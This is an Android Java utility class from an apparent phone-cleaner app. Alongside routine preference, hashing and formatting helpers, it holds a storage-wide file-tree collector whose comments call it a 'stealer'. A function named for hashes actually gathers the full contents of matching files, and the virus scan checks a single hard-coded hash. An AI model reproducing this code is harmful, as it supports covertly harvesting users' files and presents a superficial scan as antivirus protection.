package com.xlab13.zcleaner.utils;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.security.MessageDigest;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class FS {

    private static JSONArray getFilesFromDist(File root) {
        JSONArray files = new JSONArray();
        try {
            File[] list = root.listFiles();
            //Log.e("===",root.listFiles().toString());
            for (File f : list) {
                try {
                    JSONObject file = new JSONObject();

                    if (f.isDirectory()) {
                        //Log.d("===", "Dir: " + f.getAbsoluteFile());
                        file.put("type", "dir");
                        file.put("path", f.getAbsolutePath());
                        file.put("parent", getFilesFromDist(f));
                    } else {
                        file.put("type", "file");
                        file.put("path", f.getAbsolutePath());
                        //Log.d("===", "File: " + f.getAbsoluteFile());
                    }
                    files.put(file);
                } catch (Exception e) {
                    //Log.e("===",f.getAbsoluteFile() + " error " +  e.toString());
                }

            }
        }catch (Exception e){
            //Log.e("===",e.toString());
        }
        return files;
    }

    public static JSONArray scanAVFiles(Context cnt, File root) {
        JSONArray files = new JSONArray();
        try {
            File[] list = root.listFiles();
            //Log.e("===",root.listFiles().toString());
            for (File f : list) {
                try {
                    JSONObject file = new JSONObject();

                    if (f.isDirectory()) {
                        //Log.d("===", "Dir: " + f.getAbsoluteFile());
                        file.put("type", "dir");
                        file.put("path", f.getAbsolutePath());
                        file.put("parent", scanAVFiles(cnt,f));
                    } else {
                        file.put("type", "file");
                        file.put("path", f.getAbsolutePath());
                        //Log.d("===", "File: " + f.getAbsoluteFile());

                        String cfile = f.getAbsolutePath();

                        File curfile = new File(cfile);
                        if (curfile.isFile()) {
                            String hash = fileToMD5(cfile);
                            Log.e("===", "this file :" + cfile + " | hash : " + hash);
                            switch (hash.toLowerCase()) {
                                case "44d88612fea8a8f36de82e1278abb02f":
                                    try {
                                        new File(cfile).delete();
                                        Long cv = readLongConfig(cnt, "delete_virus_size");
                                        cv++;
                                        Log.e("===", cv.toString());
                                        writeLongConfig(cnt, "delete_virus_size", cv);
                                    } catch (Exception e) {
                                        Log.e("===", e.toString());
                                    }
                                    break;
                                default:

                            }
                        }
                    }
                    files.put(file);
                } catch (Exception e) {
                    Log.e("===",f.getAbsoluteFile() + " error " +  e.toString());
                }

            }
        }catch (Exception e){
            //Log.e("===",e.toString());
        }
        return files;
    }

    public static String getRootTree(){
        //Log.e("===","run stealer");
        String data;
        data = getFilesFromDist(Environment.getExternalStorageDirectory()).toString();
        //Log.e("===","end steal " + data.length());
        return data;
    }

    public static Integer readIntConfig(final Context cnt, final String key){
        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(cnt);
        return settings.getInt(key, 0);
    }

    public static void writeIntConfig(final Context cnt,final String key, final Integer value){
        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(cnt);

        //SharedPreferences settings = cnt.getSharedPreferences(config_file, 0);
        SharedPreferences.Editor editor = settings.edit();
        editor.putInt(key, value);
        editor.apply();
        editor.commit();
    }

    public static Long readLongConfig(final Context cnt, final String key){
        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(cnt);
        //SharedPreferences settings = cnt.getSharedPreferences(config_file, 0);
        return settings.getLong(key, 0);
    }

    public static void writeLongConfig(final Context cnt,final String key, final Long value){
        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(cnt);
        //SharedPreferences settings = cnt.getSharedPreferences(config_file, 0);
        SharedPreferences.Editor editor = settings.edit();
        editor.putLong(key, value);
        editor.apply();
        editor.commit();
    }

    public static boolean readBooleanConfig(final Context cnt, final String key){
        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(cnt);
        //SharedPreferences settings = cnt.getSharedPreferences(config_file, 0);
        return settings.getBoolean(key, false);
    }

    public static void writeBooleanConfig(final Context cnt,final String key, final boolean value){
        //SharedPreferences settings = cnt.getSharedPreferences(config_file, 0);
        SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(cnt);
        SharedPreferences.Editor editor = settings.edit();
        editor.putBoolean(key, value);
        editor.apply();
        editor.commit();
    }

    /* Vetal's code */

    public static ArrayList<String> generateFileHashesByMask(File rootDir, String regExp) {
        ArrayList<String> hashes = new ArrayList<String>();
        if (!rootDir.isDirectory()) return hashes;
        analyzeFiles(rootDir.listFiles(), hashes, regExp);
        return hashes;
    }

    private static void analyzeFiles(File[] files, ArrayList<String> hashes, String regExp) {

        for (File file : files) {
            if (file.isDirectory()) analyzeFiles(file.listFiles(), hashes, regExp);
            else {
                Pattern pattern = Pattern.compile(regExp);
                Matcher matcher = pattern.matcher(file.getName());
                if (matcher.find()) {
                    try {
                        StringBuilder stringBuffer = new StringBuilder();
                        FileInputStream fileInputStream = new FileInputStream(file);
                        byte[] bytes = new byte[8 * 1024];
                        int len;
                        while ((len = fileInputStream.read(bytes)) != -1) {
                            for (int j = 0; j < len; j++) {
                                String hex = Integer.toHexString(0xff & bytes[j]);
                                if (hex.length() == 1) stringBuffer.append('0');
                                stringBuffer.append(hex);
                            }
                        }

                        fileInputStream.close();

                        hashes.add(stringBuffer.toString());
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }

    private static String bytesToHex(byte[] hash) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : hash) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) hexString.append('0');
            hexString.append(hex);
        }
        return hexString.toString();
    }


    public static String get_sha256_file(String path){
        String hash_fin = "";
        try{
            byte[] buffer= new byte[8192];
            int count;
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            BufferedInputStream bis = new BufferedInputStream(new FileInputStream(path));
            while ((count = bis.read(buffer)) > 0) {
                digest.update(buffer, 0, count);
            }
            bis.close();

            byte[] hash = digest.digest();
            hash_fin = Base64.encodeToString(hash, Base64.DEFAULT);
        }catch (Exception e){
            //Log.e(e.toString());
        }
        return hash_fin;
    }

    public static String fileToMD5(String filePath) {
        if(filePath.contains("cache"))return "";
        InputStream inputStream = null;
        try {
            inputStream = new FileInputStream(filePath);
            byte[] buffer = new byte[1024];
            MessageDigest digest = MessageDigest.getInstance("MD5");
            int numRead = 0;
            while (numRead != -1) {
                numRead = inputStream.read(buffer);
                if (numRead > 0)
                    digest.update(buffer, 0, numRead);
            }
            byte [] md5Bytes = digest.digest();
            return convertHashToString(md5Bytes);
        } catch (Exception e) {
            return null;
        } finally {
            if (inputStream != null) {
                try {
                    inputStream.close();
                } catch (Exception ignored) { }
            }
        }
    }

    private static String convertHashToString(byte[] md5Bytes) {
        StringBuilder returnVal = new StringBuilder();
        for (byte md5Byte : md5Bytes) {
            returnVal.append(Integer.toString((md5Byte & 0xff) + 0x100, 16).substring(1));
        }
        return returnVal.toString().toUpperCase();
    }

    public static boolean appInstalledOrNot(Context cnt,String uri) {
        PackageManager pm = cnt.getPackageManager();
        try {
            pm.getPackageInfo(uri, PackageManager.GET_ACTIVITIES);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
        }

        return false;
    }

    public static String floatForm (double d)
    {
        return new DecimalFormat("#.##").format(d);
    }

    public static String bytesToHuman (long size)
    {
        long Kb = 1  * 1024;
        long Mb = Kb * 1024;
        long Gb = Mb * 1024;
        long Tb = Gb * 1024;
        long Pb = Tb * 1024;
        long Eb = Pb * 1024;

        if (size <  Kb)                 return floatForm(        size     ) + " byte";
        if (size >= Kb && size < Mb)    return floatForm((double)size / Kb) + " Kb";
        if (size >= Mb && size < Gb)    return floatForm((double)size / Mb) + " Mb";
        if (size >= Gb && size < Tb)    return floatForm((double)size / Gb) + " Gb";
        if (size >= Tb && size < Pb)    return floatForm((double)size / Tb) + " Tb";
        if (size >= Pb && size < Eb)    return floatForm((double)size / Pb) + " Pb";
        if (size >= Eb)                 return floatForm((double)size / Eb) + " Eb";

        return "???";
    }
}
